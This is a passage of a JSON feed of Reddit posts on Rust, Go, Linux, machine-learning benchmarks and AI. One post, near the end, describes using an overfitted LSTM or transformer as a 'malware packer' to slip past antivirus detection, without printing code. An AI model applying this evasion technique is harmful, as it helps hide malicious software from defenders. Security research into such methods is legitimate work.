PHY subsystem.\n</td></tr></tbody></table><p>\nOf course, many drivers have specific hardware concerns or other complications;\nkernel software is distinguished by its complexity and concern with low-level\ndetails. The next article in this series will look at the design of the interface\nbetween the C and Rust code in the kernel, as well as the process of adding new\nbindings when necessary.\n</p>","contentLength":13254,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lnhc47/how_to_write_rust_in_the_linux_kernel_part_2/"},{"title":"A Primer on Memory Management","url":"https://sudomsg.com/posts/a-primer-on-memory-management/","date":1751210640,"author":"/u/marcthe12","guid":175276,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lnhbnn/a_primer_on_memory_management/"},{"title":"Nick Bostrom says AGI won’t stop at the human level, it will quickly lead to superintelligence. From there, machines will outthink the best scientists and invent everything else -- faster and better than humans. \"It's the last invention we’ll ever need.\"","url":"https://v.redd.it/3vyph6eawv9f1","date":1751210632,"author":"/u/MetaKnowing","guid":175232,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lnhbjl/nick_bostrom_says_agi_wont_stop_at_the_human/"},{"title":"Rewriting pre-1.0 compiler code for better macro error messages","url":"https://github.com/rust-lang/rust/pull/143070","date":1751210168,"author":"/u/kibwen","guid":175308,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lnh4us/rewriting_pre10_compiler_code_for_better_macro/"},{"title":"Built a tool to sync Obsidian notes across devices without subscriptions or Git commands","url":"https://www.reddit.com/r/linux/comments/1lnh4jy/built_a_tool_to_sync_obsidian_notes_across/","date":1751210147,"author":"/u/believertn","guid":175311,"unread":true,"content":"<p>As someone who spends a lot of time on Linux and likes to take notes in Obsidian, I found syncing notes across multiple devices frustrating. I distro hop often, and making sure my notes are updated everywhere without paying for Obsidian Sync or fiddling with Git commands became a problem I wanted to solve.</p><p>So I built Ogresync, a free and open-source tool that handles syncing your Obsidian vault automatically using GitHub in the background. Instead of opening Obsidian directly, you launch Ogresync, which syncs your vault, opens Obsidian, and then pushes your changes after you finish editing. There’s no need to remember Git commands or worry about merge conflicts.</p><p>I know there are plugins that do something similar, but they often expect users to be comfortable with Git. I wanted a solution that just works out of the box, even for people who don’t want to deal with version control.</p><p>I’d really appreciate feedback from fellow Linux users. How do you sync your notes right now? Does this approach make sense or is there something you’d want it to do differently?</p>","contentLength":1075,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Software to format a book","url":"https://www.reddit.com/r/linux/comments/1lngyhb/software_to_format_a_book/","date":1751209723,"author":"/u/Popular_Tour1811","guid":175233,"unread":true,"content":"<p>My grandma is writing a book on her familys' history. I, being the computer literate grandchild, am task with formatting and diagramming the book. Unfortunately, the only software I know for that is Microsoft Publisher and Canva. Anyone know a Foss alternative for those?</p><p>(I don't know if formatting is the right word for that, nor diagramming. I mean turning plain text into a nice looking pdf with well positioned images that can be printed into a book)</p>","contentLength":454,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"what's the convention for how types and their corresponding methods should be grouped within a file?","url":"https://www.reddit.com/r/golang/comments/1lnex8l/whats_the_convention_for_how_types_and_their/","date":1751204349,"author":"/u/Fueled_by_sugar","guid":175403,"unread":true,"content":"<div><p>option a - all the types first, all the methods second:</p><pre><code>type accessToken string type status uint type organizationID string func (a accessToken) String() string { return string(a) } func (o organizationID) String() string { return string(o) } func (s status) Uint() uint { return uint(s) } </code></pre><p>option b - methods go below their corresponding types:</p><pre><code>type accessToken string func (a accessToken) String() string { return string(a) } type status uint func (s status) Uint() uint { return uint(s) } type organizationID string func (o organizationID) String() string { return string(o) } </code></pre></div>   submitted by   <a href=\"https://www.reddit.com/user/Fueled_by_sugar\"> /u/Fueled_by_sugar </a>","contentLength":615,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[P] I built a Python debugger that you can talk to","url":"https://www.reddit.com/r/MachineLearning/comments/1lnem9e/p_i_built_a_python_debugger_that_you_can_talk_to/","date":1751203482,"author":"/u/jsonathan","guid":175277,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Position: Machine Learning Conferences Should Establish a “Refutations and Critiques” Track","url":"https://arxiv.org/pdf/2506.19882","date":1751202449,"author":"/u/StartledWatermelon","guid":176393,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/MachineLearning/comments/1lne9e0/d_position_machine_learning_conferences_should/"},{"title":"Tracking Anticheat Updates","url":"https://not-matthias.github.io/posts/anticheat-update-tracking/","date":1751200973,"author":"/u/not-matthias","guid":175230,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lndrvx/tracking_anticheat_updates/"},{"title":"My Linux survived where Windows died","url":"https://www.reddit.com/r/linux/comments/1lndntz/my_linux_survived_where_windows_died/","date":1751200614,"author":"/u/githman","guid":175125,"unread":true,"content":"<p>TLDR: Modern Linux drivers and hardware compatibility are not as finicky as some people say.</p><p>My government keeps trying to break our energy system to goodbye; a recent malfunction of power mains fried my old PC's PSU and motherboard but the drive fortunately survived. I bought a slightly more recent system on the local flea market (i5-7400 instead of the old i7-3770K) for the whole whopping €70 and plugged the drive into it. The drive had both Windows 10 and Fedora 42 KDE installed.</p><p>The outcome: Fedora picked up the new hardware like nothing happened but Windows is stuck on \"getting devices ready\" forever. Guess it's time to reclaim the Windows partition.</p><p>Great job, Fedora and Linux in general. I had to tell it someone and decided to do it here because where else, right.</p>","contentLength":780,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A Tale of Rust Adoption at my Work place","url":"https://www.reddit.com/r/rust/comments/1lnburk/a_tale_of_rust_adoption_at_my_work_place/","date":1751194396,"author":"/u/Vilayat_Ali","guid":175228,"unread":true,"content":"<p>Hello wonderful rustaceans! I am Vilayat and I work as a senior software engineer at a US based social media company. A few months ago, we had our video processing and indexing service written in Typescript using <code>AWS Cloud Development Kit</code>. However things started to bottleneck and we faced high AWS bills and our service started to fail to scale as having more TS and code for complex business logic but it also caused big bundle size and what not. Simple description - JS hell in a git repo deployed on AWS. So, the technical leadership asked for porting most of our newer business logic into Golang. And it was this decision that makes Rust, the superhero. So we finished porting the code from TS into Golang. Everything went smoothly and it all went great. Until recently, the team lead had an idea, our auth service handles millions of request so why not port it into go? So he did. Until he faced a issue. So we need to have unified routes for all users and decisions take place at handlers. And in order to abstract the issue, using a interface is preferred, so he did.<p> Created subtypes for each major user type, defined interface for most common permission handlers. But what about general ones? golang doesnt support empty interface implementations. </p></p><p>type GeneralPermission interface {}</p><p>// cant implement it on user GeneralPermission</p><p>So he brought the issue as it makes RBAC a major issue and code will be verbose and hard to maintain. Worst part was, he was a week into the effort so the upper management was expecting results.</p><p>Until I told him, the beauty of traits!!!!!!</p><p><code>impl User for PowerUser {}</code></p><p><code>impl User for CustomerUser {}</code></p><p>So, we secretly ported the existing service into a single axum server (Rust!!) using sqlx as query builder. Everything is heaven then. Tech team is now open minded and everything is praising the language. </p><p>The upper management is interested to use rust as much as possible!</p><p>When Go’s limitations hit, <strong>Rust’s traits and performance</strong> swoop in to save the day.</p><p><em>\"Why fight the language when you can just use Rust?\"</em></p><p><strong>Has your team faced a similar turning point? Share your war stories below!</strong> 🚀</p>","contentLength":2121,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"On Error Handling in Rust","url":"https://felix-knorr.net/posts/2025-06-29-rust-error-handling.html","date":1751194002,"author":"/u/KnorrFG","guid":175229,"unread":true,"content":"<p>The current standard for error handling, when writing a crate, is to define\none error enum per module, or one for the whole crate\nthat covers all error cases that the module or crate\ncan possibly produce, and each public function that returns a  will use\nsaid error enum.</p><p>This means, that a function will return an error enum, containing error variants that\nthe function cannot even produce. If you match on this error enum, you will\nhave to manually distinguish which of those variants are not applicable in\nyour current scope, based on the documentation of the function (and who reads that anyway? /s).</p><h2>The problem with the status quo</h2><p>What makes Rust so great, is the ability to express requirements via the type\nsystem in a way that makes it very hard for you to violate them, and yet, we\ncollectively decided to create these huge error-enums. I completely understand\nwhere this is coming from. Defining an extra error enum for every function\nand all the conversions between them is extremely tedious. And so everyone and\ntheir mother is building big error types. Well, not Everyone. A small handful of\nindomitable nerds still holds out against the standard.</p><p>An error is a singular bit of information, might be completely independent\nof other errors a function can return, and should probably be represented\nby a struct rather than an enum variant. A function returns one of\na set of those if it goes wrong, but it doesn't define the errors\nthemselves. The first Rust crate I saw that followed this philosophy, was\n<a href=\"https://docs.rs/terrors/latest/terrors/\">terrors</a> (Go ahead, check it out).\nI still think it's beautiful. It's also a little inconvenient.\nYou have to write  a lot and some functions\nhave a lot of possible error points, some of which being\nthe contents of other function's error sets. And yet, you have to spell\nthem out all over again. Still, I really like this crate ... from a distance.</p><p>Speaking of error sets, there is a\n<a href=\"https://docs.rs/error_set/latest/error_set/\">crate</a> with this name, that I\nprefer to use nowadays. Instead of doing Olympia level type acrobatics (like\nterrors) it uses macros. It allows you to define error enums for different\nfunctions in a very concise way and automatically generates the trait\nimplementations for conversions between those. Want a taste?</p><div><pre><code></code></pre></div><p>It allows us to create error sets from variants and from unions with other error sets.\nThe  operator will work if the error set you use it on is a sub-set of the function's\nerror set, and it will find out whether that's the case, even if you don't use the\nunion operator, i.e. this works:</p><div><pre><code></code></pre></div><p>This is still a bit too verbose for my tastes if you use many actual struct errors,\ne.g. because you want some fields on them to carry additional information, or because\nyou want to annotate them with error messages. However, I need them seldomly enough,\nso that I'll happily pay the extra keystrokes to define a wrapper enum for them\n(like the  enum in the first example) for now.</p><p>There are more libraries out there that explore this paradigm in different ways,\ne.g. <a href=\"https://crates.io/crates/smarterr\">SmartErr</a>. And I once saw a crate\nthat offered an attribute macro that you could slap on a function, and then\nit would parse the functions body and generate an error enum and insert it into\nthe functions return type,\nbased on the errors that occured in the function's body. Sadly I didn't find\nit again despite searching for it for an hour. If anyone has a link,\nplease tell me.</p>","contentLength":3339,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lnbr0g/on_error_handling_in_rust/"},{"title":"Methods vs Interfaces","url":"https://www.reddit.com/r/golang/comments/1lnay0f/methods_vs_interfaces/","date":1751190819,"author":"/u/Typical_Ranger","guid":175520,"unread":true,"content":"<p>I am new to Go and wanting to get a deeper understanding of how methods and interfaces interact. It seems that interfaces for the most part are very similar to interfaces in Java, in the sense that they describe a contract between supplier and consumer. I will refer to the code below for my post.</p><p>This is a very superficial example but the  method only knows that its parameter has a method . Otherwise, it has no idea of any other possible fields on it (in this case  and ).</p><p>So from my point of view, I am wondering why would you want to pass an interface as a function parameter? You can only use the interface methods from that parameter which you could easily do without introducing a new function. That is, replace the function call  with just . In fact because of the rules around interface method sets, if we get rid of  and defined  as  instead, we could still use  whereas passing  to  with this new definition would cause a compile-time error.</p><p>I guess what I am trying to get at is, what exactly does using interfaces provide over just calling the method on the struct? Is it just flexibility and extensibility of the code? That is, interface over implementation?</p><pre><code>package main import ( \"fmt\" \"time\" ) func main() { c := &amp;Counter{} fmt.Println(c.total) runIncrement(c) // c.Increment() fmt.Println(c.total) } func runIncrement(c Incrementer) { c.Increment() return } type Incrementer interface { Increment() } type Counter struct { total int lastUpdated time.Time } func (c *Counter) Increment() { c.total++ c.lastUpdated = time.Now() } func (c Counter) String() string { return fmt.Sprintf(\"total: %d, last updated %v\", c.total, c.lastUpdated) } </code></pre>","contentLength":1653,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Desperately in need of a Sepia /Beige theme","url":"https://www.reddit.com/r/linux/comments/1lnawxe/desperately_in_need_of_a_sepia_beige_theme/","date":1751190695,"author":"/u/any_01","guid":175035,"unread":true,"content":"<p>I've had enough of light theme, it is too bright. I've had enough of dark theme, it is too dark. I fell in love with the sepia colour scheme available on wikipedia and firefox reader mode.</p><p>Beige background, brown icons, black text.</p><p>Desktop environment should just allow you to customise your colour scheme like android does with material you, choosing a background and highlight colour yourself instead of bland boring binary dark and light.</p>","contentLength":439,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux mint XFCE terminal costumization & effects","url":"https://www.reddit.com/r/linux/comments/1ln9qdf/linux_mint_xfce_terminal_costumization_effects/","date":1751185910,"author":"/u/mitsikelis","guid":175098,"unread":true,"content":"<div><p>How can I create something like this in my Linux mint XFCE, (if it is possible of course), I was originally planning to use i3 or picom however I heard that Linux mint XFCE uses xfwm. If it is possible to download and make it work will someone guide me on how to download it and make it work</p></div>   submitted by   <a href=\"https://www.reddit.com/user/mitsikelis\"> /u/mitsikelis </a>","contentLength":324,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Test names should be sentences","url":"https://bitfieldconsulting.com/posts/test-names","date":1751185576,"author":"/u/AlexandraLinnea","guid":175096,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1ln9nho/test_names_should_be_sentences/"},{"title":"Go Cookbook","url":"https://www.reddit.com/r/golang/comments/1ln9a3g/go_cookbook/","date":1751184059,"author":"/u/441labs","guid":174996,"unread":true,"content":"<p>I have been using Golang for 10+ years and over the time I compiled a list of Go snippets and released this project that currently contains 222 snippets across 36 categories.</p><p>Would love your feedback — the project is pretty new and I would be happy to make it a useful tool for all types of Go devs: from Go beginners who can quickly search for code examples to experienced developers who want to learn performance tips, common pitfalls and best practices (included into most of snippets). Also let me know if you have any category/snippet ideas — the list is evolving.</p>","contentLength":572,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] SAMformer -- a lesson in reading benchmarks carefully","url":"https://www.reddit.com/r/MachineLearning/comments/1ln8wu8/d_samformer_a_lesson_in_reading_benchmarks/","date":1751182566,"author":"/u/Gigawrench","guid":175231,"unread":true,"content":"<p>For those not in the time-series forecasting space, it has seen some interesting developments in the last few years as researchers have tried to translate the success of transformer-based models in the language domain, to the forecasting domain. There was incremental progress in long-term timeseries forecasting with the likes of <a href=\"https://arxiv.org/abs/2012.07436\">Informer</a>, <a href=\"https://arxiv.org/abs/2106.13008\">Autoformer</a>, and <a href=\"https://arxiv.org/pdf/2201.12740\">Fedformer</a>, among others, however the 2022 <a href=\"https://arxiv.org/abs/2205.13504\">paper </a>\"Are Transformers Effective for Time Series Forecasting?\" (Zeng et al.) called into question how much progress these models had actually made.</p><p>Zeng et al. introduced three self-proclaimed \"embarassingly simple\" linear models -- each of which are variations on a  mapping the input values to the output values -- which outperformed all of the above state-of-the-art transformer models on their benchmarks (see the image below for a subset of results):</p><p>This brings us to the paper <a href=\"https://arxiv.org/abs/2402.10198\">SAMformer</a> which applies a \"sharpness-aware minimisation\" approach to training a simplified version of the vanilla transformer encoder. This works very well, generally outperforming the aforementioned transformer models, as well as competetive non-transformer state-of-the-art models (TSMixer and PatchTST), on all the same benchmarks. Notably absent in the benchmarks however, are the linear models from Zeng et al. You can see the results from the SAMformer paper below (all results are ): </p><p>On Electricity, Exchange, and Weather the simple linear models outperform SAMformer for all horizons, and it is only on the Traffic dataset where SAMformer achieves lower MSE. The omission of the linear models in the final benchmarks is doubly surprising given the SAMformer authors specifically mention the results from Zeng et al. in their introduction:</p><p>\"[Zeng et al.] recently found that linear networks can be on par or better than transformers for the forecasting task, questioning their practical utility. This curious finding serves as a starting point for our work.\"</p><p>To be clear, I think the ideas introduced in the SAMformer paper are valuable and I think it would be fair to classify SAMformer as a \"state-of-the-art\" model. However, I am curious of the rationale for excluding the linear models in the benchmarks given they were originally introduced to call into question the effectiveness of transformers in the time-series forecasting domain.</p><p>Tl;dr: Always put your skeptical glasses on when reviewing benchmarks as there may be some highly competetive models omitted from the analysis.</p>","contentLength":2470,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I didn’t know that Go is hated so much","url":"https://www.reddit.com/r/golang/comments/1ln7lav/i_didnt_know_that_go_is_hated_so_much/","date":1751177346,"author":"/u/legendaryexistence","guid":174936,"unread":true,"content":"<p>What is the reason? What do you think? Should Go team address this topic?</p>","contentLength":73,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Examples of Rust bindings for C++ libraries using CXX","url":"https://www.reddit.com/r/rust/comments/1ln72p3/examples_of_rust_bindings_for_c_libraries_using/","date":1751175386,"author":"/u/DJDuque","guid":175363,"unread":true,"content":"<p>There is a C++ library and I want to write some Rust bindings for it. After looking through my options, it looks like  is what I want, but I am struggling to find examples of Rust bindings for C++ libraries using .</p><p>Could people share any links to repos doing this? I want to get a feeling on how to organize such a project, etc. So far I have only found [this project](<a href=\"https://github.com/mkovaxx/mfem-rs\">https://github.com/mkovaxx/mfem-rs</a>), I want to see how other people do this.</p><p>Ideally out of tree (I'm not author/contributor to the C++ library), high quality bindings I can get some inspiration from.</p>","contentLength":567,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Locking down golang web services in a systemd jail?","url":"https://www.reddit.com/r/golang/comments/1ln6xeh/locking_down_golang_web_services_in_a_systemd_jail/","date":1751174830,"author":"/u/CodeWithADHD","guid":175124,"unread":true,"content":"<p>I recently went down a rabbit hole where I wanted to lock down my go web service in a chrooted jail so that even if I made mistakes in coding, the OS could prevent access to the rest of the filesystem. What I found was that systemd was actually a pretty cool way to do this. I ended up using systemd to:</p><p>- chroot - restrict network access to only localhost</p><p>- restrict kernel privileges</p><p>- prevent viewing other processes</p><p>And then I ended up putting my web service inside a jail and putting inbound and outbound proxies on the other side of the jail, so that incoming traffic gets routed through nginx to the localhost port, but outbound traffic is restricted by my outbound proxy so that it can only access the one specific web site where I call dependent web services from and nothing else. </p><p>If I do end up with vulnerabilities in my web service, an attacker wouldn't even be able to get shell access because there is no shell in my chrooted jail.</p><p>Because go produces static single binaries (don't forget to disable CGO for the amd64 platform or it's dynamically linked), go is the only language I can really see this approach working for. Anything else is going to have extra runtime dependencies that make it a pain to set up chrooted.</p><p>Does anyone else do this with their go web services?</p><p>Leaving my systemd service definition here for discussion and as a breadcrumb in case anyone else is doing this with their go services:</p><p>Description=myapp service</p><p>EnvironmentFile=/etc/myapp/secrets</p><p>Environment=\"http_proxy=localhost:8181\"</p><p>Environment=\"https_proxy=localhost:8181\"</p><p>InaccessiblePaths=/home/myapp/.ssh</p><p>RootDirectory=/home/myapp </p><p>IPAddressAllow=127.0.0.53</p><p>RestrictAddressFamilies=AF_INET AF_INET6</p><p># Needed for https outbound to work</p><p>BindReadOnlyPaths=/etc/ssl:/etc/ssl</p><p># Needed for dns lookups to youtube to work</p><p>BindReadOnlyPaths=/etc/resolv.conf:/etc/resolv.conf</p><p>StandardOutput=append:/var/log/meezy.log</p><p># Drop privileges and limit access</p><p>ProtectKernelModules=true</p><p>RestrictAddressFamilies=AF_INET AF_INET6</p><p># Sandboxing and resource limits</p><p>MemoryDenyWriteExecute=true</p><p># Prevent network modifications</p><p>ProtectControlGroups=true</p><p>ProtectKernelTunables=true</p><p>SystemCallFilter=@system-service</p>","contentLength":2157,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Slouching towards sensemaking","url":"https://karanchawla.io/2025/06/29/sensemaking","date":1751174522,"author":"/u/calmcroissant","guid":175123,"unread":true,"content":"<p>There’s a particular quality to the confusion of our current moment that reminds me of standing in Dolores Park at dusk, watching fog roll in from Twin Peaks while the Mission stays stubbornly sunny. We’re between weather systems, between worlds. The old information order – built on broadcast towers and printing presses, gatekeepers and institutions – is visibly dissolving. The new one hasn’t quite condensed into recognizable forms yet. We’re in the interregnum, and it’s both terrifying and thrilling.</p><p>The thing is, we’ve been here before. Sort of.</p><p>Every era has its dominant metaphor for how knowledge works. The Enlightenment gave us the mind as a blank slate, waiting to be written upon by experience. The industrial age reimagined thinking as a kind of factory, processing raw inputs into refined outputs. The computer age taught us to think of brains as information processors, running algorithms on data.</p><p>Now we have LLMs, and they’re scrambling all our metaphors. They’re not databases – they don’t store and retrieve information in any conventional sense. They’re not search engines – they don’t point you to existing content. They’re more like… meaning machines? Reality synthesizers? Semantic improvisers?</p><p>The closest analogy I can find comes from music. A jazz musician doesn’t memorize every possible melody. Instead, they internalize patterns, relationships, and structures that let them generate novel-but-coherent musical phrases in real time. LLMs do something similar with language and concepts. They’ve absorbed the deep patterns of human meaning-making and can riff on them endlessly.</p><p>But here’s the catch: a jazz musician knows when they’re improvising. We don’t always recognize when an LLM is making things up.</p><p>To understand where we’re headed, it helps to see what’s being taken apart. The 20th century bundled several functions into single institutions:</p><ol><li>Fact-gathering and verification (journalism)</li><li>Analysis and interpretation (academia)</li><li>Narrative construction (media)</li><li>Cultural transmission (education)</li><li>Collective sensemaking (democratic deliberation)</li></ol><p>These institutions were never perfect, but they provided structured processes for turning raw information into shared understanding. They had gatekeepers, methodologies, and accountability mechanisms. They moved slowly, but that slowness enabled certain kinds of rigor.</p><p>LLMs unbundle all of these functions and make them available on-demand, at arbitrary scale, with zero marginal cost. Want fact-checking? Analysis? A compelling narrative? Cultural context? It’s all there, instantaneously, tailored to your specific query.</p><p>This is intoxicating. It’s also dangerous. When you can generate plausible-sounding information about anything instantaneously, the very idea of “checking” or “verifying” starts to break down. The speed of generation outpaces the speed of verification by orders of magnitude.</p><p>Here’s something I’ve noticed: LLMs don’t just have biases (though they do). They have what I call an “ambient ideology” – a pervasive orientation toward reality that colors everything they produce. This isn’t explicitly political. It’s more like a set of unexamined assumptions about how the world works:</p><ol><li>Consensus is usually correct</li><li>Complexity can be simplified without loss</li><li>All perspectives can be reconciled</li><li>Conflict is a communication problem</li><li>Every question has an answer</li></ol><p>These assumptions aren’t necessarily wrong, but they’re not neutral either. They shape how LLMs frame issues, what solutions they propose, what possibilities they can and can’t imagine. And because this ideology is ambient – built into the very structure of how these systems generate text – it’s incredibly hard to notice, much less resist.</p><p>When we outsource our sensemaking to these systems, we’re not just getting help processing information. We’re absorbing their implicit worldview, their way of constructing meaning. It’s like wearing tinted glasses so long you forget the world isn’t actually pink.</p><p>If information is a landscape, then understanding is about navigation – finding paths between ideas, mapping territories of knowledge, recognizing landmarks of truth. Traditional institutions created well-worn paths through this landscape. Textbooks, curricula, and canons were like marked trails – they told you which routes were safe, which vistas were worth seeing, which areas to avoid. These paths had ideological assumptions built in, sure, but at least those assumptions were relatively visible and contestable.</p><p>Social media turned the landscape into a trackless waste. Every point connects to every other point with no clear paths between them. You can teleport instantly from vaccine research to ancient aliens to your high school friend’s wedding photos. The topology is flat, directionless, disorienting.</p><p>LLMs promise to be perfect guides through this landscape. They seem to know every path, every connection, every shortcut. But they’re not guides – they’re more like dreamwalkers, creating paths as they go, generating landscapes that feel real but might dissolve the moment you look away. There’s a deeper issue here about cognitive prosthetics. Every tool we use shapes not just what we can do but who we become. Write enough and you think differently. Code enough and you start seeing systems everywhere.</p><p>LLMs are cognitive prosthetics of unprecedented power. They don’t just augment specific abilities; they offer to replace entire cognitive functions. Why struggle to synthesize ideas when it can do it instantly? Why develop your own analytical frameworks when it can generate twenty of them on demand?</p><p>The risk isn’t that these tools will make us stupid. It’s that they’ll make us differently-abled in ways we don’t fully understand. We’re trading certain cognitive capacities for others without a clear map of what we’re giving up or gaining. I see this in my own work. I reach for ChatGPT reflexively now when I’m stuck on a problem. Sometimes it genuinely helps me see new angles. But sometimes it short-circuits the productive struggle that leads to real insight. The difference isn’t always clear in the moment.</p><p>So what would better sensemaking architectures look like?</p><p>I don’t think it’s about rejecting LLMs or returning to some imagined golden age of institutional authority. We need new patterns that enhance rather than replace human judgment. I can imagine tools that create productive friction – systems that make us articulate our own understanding before offering synthesis. Or platforms that foreground disagreement rather than consensus, helping us map the space of reasonable interpretations rather than collapsing to a single “answer.”</p><p>We might build systems that make their uncertainty visible, that show us not just what they “know” but the gaps and contradictions in their training. Or tools that help communities develop their own localized models, trained on specific traditions of thought rather than the undifferentiated mass of internet text.</p><p>The key insight is that sensemaking isn’t just about getting answers. It’s about developing judgment, building mental models, learning to navigate uncertainty. Good tools would support this development rather than obviate it.</p><p>Sensemaking is fundamentally social – it’s about <a href=\"https://karanchawla.io/2025/06/29/2025-05-16-infiniteconvo.md\">creating shared understanding</a>, not just personal insight. We need institutional forms that can support collective sensemaking in an LLM-saturated world.</p><p>There’s an urgency to these questions that’s hard to overstate. We’re not in a stable equilibrium that we can thoughtfully reform. We’re in a phase transition, and the new patterns are crystallizing rapidly. Every day, millions of people are developing new habits around LLMs. Students are learning to learn with ChatGPT as a constant companion. Professionals are baking AI-generated insights into decision-making processes. These practices are becoming normalized before we understand their implications.</p><p>The risk isn’t technological determinism – it’s institutional drift. We’ll wake up in five years and realize we’ve rebuilt our entire knowledge ecosystem around tools whose effects we never properly examined. The architecture of our collective sensemaking will have shifted in ways we can’t easily undo.</p><p>Despite the urgency, I’m not pessimistic. The same malleability that makes this moment dangerous also makes it full of possibility. We can build better sensemaking architectures if we’re intentional about it. Start small. In my own practice, I’ve developed rules for when and how I use LLMs:</p><ol><li>I write my own first draft before asking for alternatives</li><li>I fact-check surprising claims through non-LLM sources</li><li>I use multiple models and compare their outputs</li><li>I regularly practice tasks without AI assistance to maintain native capacity</li></ol><p>We need to recognize that this isn’t just a technical problem. It’s about the fundamental question of how we understand reality together. The infrastructure we build for collective sensemaking will shape everything else – our politics, our science, our culture, our capacity to face challenges we haven’t even imagined yet.</p><p>The title of this post comes from Yeats’ “The Second Coming” a poem about civilizational transformation; about old orders dissolving and new ones struggling to be born. The “slouching” in his poem captures something essential: transformation that’s inevitable but not graceful, powerful but not pretty.</p><p>The old epistemologies are failing. Truth and post-truth blur together. Authority dissolves into the statistical average of all human text. We’re between mythologies, and the new one hasn’t been born yet.</p><p>But perhaps slouching is exactly the right posture for this moment. Not the confident stride of techno-optimism, not the defensive crouch of Neo-Luddism, but something more tentative and experimental. We’re feeling our way toward new forms of understanding, testing what works, discovering what breaks.</p><p>The real work isn’t technical – it’s philosophical. What does it mean to know something when knowledge can be generated on demand? What does it mean to understand when understanding can be outsourced? These aren’t questions we can answer in the abstract. We have to live our way into the answers.\nWe’re all midwives now, attending this strange birth. The rough beast taking shape isn’t just a new technology but a new way of being human. Our task isn’t to prevent the birth – it’s already too late for that. Our task is to ensure that what’s born is something we can recognize as our own.</p>","contentLength":10624,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1ln6udw/slouching_towards_sensemaking/"},{"title":"Arch-KDE-wayland on rpi5 ARM at 3440x1440x100hz","url":"https://www.reddit.com/r/linux/comments/1ln6ds4/archkdewayland_on_rpi5_arm_at_3440x1440x100hz/","date":1751172815,"author":"/u/DisappointedLily","guid":174962,"unread":true,"content":"<p>It`s freaking beautiful, runs hyper smooth. No input lag at all, no janky animations, it's really uncanny tbh. </p><p>Handles 1080p youtube astonishingly well. As you can see, it has GIMP open together and there's still ram galore to use.</p><p>The install was very straightforward, just got the latest pi4 image of Manjaro KDE, dd'ed it into a card and bam, done. </p><p>I'm probably going to pick a small SD and make a sway Manjaro build so I can mess with and learn a bit more about sway.</p><p>I'm definitely switching from Ubuntu/PiOS to Manjaro on my general purpose SD for the Pi, it's really close to my desktop, </p>","contentLength":593,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Dyson Sphere Program - The New Multithreading Framework","url":"https://store.steampowered.com/news/app/1366540/view/543361383085900510","date":1751169398,"author":"/u/Archaya","guid":174865,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1ln5exk/dyson_sphere_program_the_new_multithreading/"},{"title":"Do you think Ai Slop is going to drive people away from social media or pull them in?","url":"https://www.reddit.com/r/artificial/comments/1ln4upi/do_you_think_ai_slop_is_going_to_drive_people/","date":1751167439,"author":"/u/JustALightSeeker","guid":174961,"unread":true,"content":"<p>I’m genuinely curious how others see this playing out. Are we heading toward feeds so packed with AI-created posts that people start looking for connection elsewhere? Or is this just the next evolution of social media? </p><p>Personally, I’d be worried if I were Meta, or maybe even YouTube. If what happened to Pinterest starts happening to them, where people just get fed up and leave because it all feels so fake or repetitive. I could honestly see a mass exodus.</p><p>Anyone noticing this shift in your own feeds?</p>","contentLength":508,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] LSTM or Transformer as \"malware packer\"","url":"https://www.reddit.com/r/MachineLearning/comments/1ln4omn/r_lstm_or_transformer_as_malware_packer/","date":1751166854,"author":"/u/Acanthisitta-Sea","guid":174887,"unread":true,"content":"<p>An alternative approach to EvilModel is packing an entire program’s code into a neural network by intentionally exploiting the overfitting phenomenon. <a href=\"https://github.com/piotrmaciejbednarski/lstm-memorizer\">I developed a prototype</a> using PyTorch and an LSTM network, which is intensively trained on a single source file until it fully memorizes its contents. Prolonged training turns the network’s weights into a data container that can later be reconstructed.</p><p>The effectiveness of this technique was confirmed by generating code identical to the original, verified through SHA-256 checksum comparisons. Similar results can also be achieved using other models, such as GRU or Decoder-Only Transformers, showcasing the flexibility of this approach.</p><p>The advantage of this type of packer lies in the absence of typical behavioral patterns that could be recognized by traditional antivirus systems. Instead of conventional encryption and decryption operations, the “unpacking” process occurs as part of the neural network’s normal inference.</p>","contentLength":988,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How trustworthy are 